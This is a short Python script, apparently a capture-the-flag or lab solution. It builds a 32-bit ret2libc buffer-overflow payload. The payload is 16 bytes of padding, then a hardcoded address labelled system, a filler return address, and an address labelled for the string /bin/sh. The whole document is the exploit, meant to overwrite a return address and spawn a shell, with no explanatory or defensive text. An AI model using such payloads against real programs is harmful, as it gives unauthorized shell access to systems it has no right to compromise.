import struct
pattern = "A" * 16
system = struct.pack("I", 0xb7ecffb0)
binsh = struct.pack("I", 0xb7fd9647)
exploit = pattern + system + "AAAA" + binsh
